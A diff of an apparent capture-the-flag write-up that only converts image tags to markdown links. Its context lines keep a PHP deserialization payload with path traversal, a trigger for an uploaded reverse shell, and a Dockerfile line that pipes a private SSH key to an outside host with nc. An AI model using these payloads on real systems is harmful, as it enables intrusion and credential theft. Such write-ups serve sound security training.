@@ -194,15 +194,15 @@ O:4:"Page":1:{s:4:"file";s:31:"../../../../../../../etc/passwd";}
 
 We can then add the exploitable subdomain to our `/etc/hosts` file and view it:
 
-<figure><img src="../../../.gitbook/assets/image (1954).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1954).png>)
 
 We can then test our PHP code and find that it works:
 
-<figure><img src="../../../.gitbook/assets/image (1857).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1857).png>)
 
 Using this, we can attempt to read the FTP configuration files to find out where the FTP directory is:
 
-<figure><img src="../../../.gitbook/assets/image (3444).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3444).png>)
 
 The FTP Root is at `/srv`, meaning the reverse shell I uploaded is at `/srv/ftp/phpreverseshell.php`. We can then execute it using this serialised object:
 
@@ -212,7 +212,7 @@ O:4:"Page":1:{s:4:"file";s:48:"../../../../../../../srv/ftp/phpreverseshell.php"
 
 I had to put the file there again since something cleared it, but I did get a reverse shell in the end:
 
-<figure><img src="../../../.gitbook/assets/image (508).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(508).png>)
 
 ## Privilege Escalation
 
@@ -267,7 +267,7 @@ RUN cat /tmp/id_rsa.bak | nc 192.168.45.196 21
 
 Then, we can run `sudo /usr/bin/docker build .` within `/opt` where the `Dockerfile` is.
 
-<figure><img src="../../../.gitbook/assets/image (2026).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2026).png>)
 
 We can then `ssh` in as `root`:
 
